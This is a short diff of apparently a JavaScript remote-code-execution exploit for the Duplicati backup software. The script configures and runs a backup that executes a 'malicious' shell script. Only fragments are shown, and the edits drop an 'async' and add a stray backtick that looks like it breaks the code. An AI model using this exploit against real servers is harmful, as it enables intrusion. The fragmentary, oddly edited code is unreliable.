@@ -24,7 +24,7 @@ Sample script:
 
 */
 
-const DuplicatiRCE = async () => {
+const DuplicatiRCE = () => {
 
     /*   Insert the location of your backup of a "malicious" shell script below.
 "FTP, SSH, WebDAV as well as popular services like Microsoft OneDrive, 
@@ -183,7 +183,7 @@ Amazon Cloud Drive & S3, Google Drive, box.com, Mega, hubiC and many others
                 })
             })
             .then(responseOKOrFail("Could not run configured backup"))
-            .then(function (d) { // data
+            .then(function (d) { // data`
                 console.log(`success: ${d}`);
             })
             .catch(e => console.log(e));
